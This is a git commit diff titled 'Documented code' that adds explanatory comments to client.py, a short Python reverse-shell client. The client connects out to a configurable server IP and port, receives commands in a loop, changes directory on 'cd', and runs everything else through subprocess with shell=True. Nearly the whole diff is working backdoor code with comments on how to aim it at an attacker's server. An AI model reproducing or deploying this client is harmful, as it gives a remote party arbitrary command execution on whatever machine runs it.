f7373f892e4289488079e3c72390a4254ccede6a
Rezn0v <34809845+vRezn0v@users.noreply.github.com>
2018-04-06 13:26:56 +0530

    Documented code

--- client.py
+++ client.py
@@ -2,16 +2,23 @@ import os
 import socket
 import subprocess
 
-host = '0.0.0.0'
-port = 9898
+#replace localhost with server ip
+host = '0.0.0.0' 
+#set to an uncommon desired value
+port = 9898 
+
 s = socket.socket()
 
+#connect to the server socket
 s.connect((host, port))
 
 while True:
+    #recieve commands from server
     data = s.recv(1024)
+    #change directory if command is 'cd'
     if data[:2].decode("utf-8") == 'cd':
         os.chdir(data[3:].decode("utf-8"))
+    #execute commands oonly after passing a length test
     if len(data) > 0:
         cmd = subprocess.Popen(data[:].decode("utf-8"), shell = True, stdout = subprocess.PIPE, stderr = subprocess.PIPE, stdin = subprocess.PIPE)
         output_bytes =  cmd.stdout.read() + cmd.stderr.read()
